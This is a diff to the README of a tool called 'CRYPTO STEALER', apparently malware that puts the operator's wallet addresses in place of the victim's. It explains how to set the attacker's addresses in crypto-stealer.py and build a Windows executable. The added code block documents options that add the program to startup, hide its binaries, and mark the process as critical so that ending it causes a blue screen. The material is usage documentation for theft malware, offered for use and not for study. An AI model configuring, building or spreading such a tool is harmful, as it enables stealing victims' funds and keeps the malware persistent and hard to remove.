@@ -1,4 +1,4 @@
-<h3 align="center">CRYPTO STEALER</h3>
+<h1 align="center">CRYPTO STEALER</h1>
 
 <img src=".github/using.gif"></img>
 
@@ -33,7 +33,11 @@ Open (`crypto-stealer.py`).
 Look for variable (`my_addresses`) and setup with anything you want.
 
 ### Useful functionalities (Only windows) (Experimental):
-The variables CRITICAL_PROCCESS, ADD_TO_STARTUP, HIDE_BINARIES are explained by themselves. Turn it as you want (`False -> True`).
+```py
+CRITICAL_PROCCESS = False # Mark the proccess as critical, if interrumpted, blue screen appears.
+ADD_TO_STARTUP = False # Add proccess to startup.
+HIDE_BINARIES = False # Hide binaries.
+```
 
 ### Making the binaries:
 When the configuration is done you should make the executable (`.exe`) to work in windows.
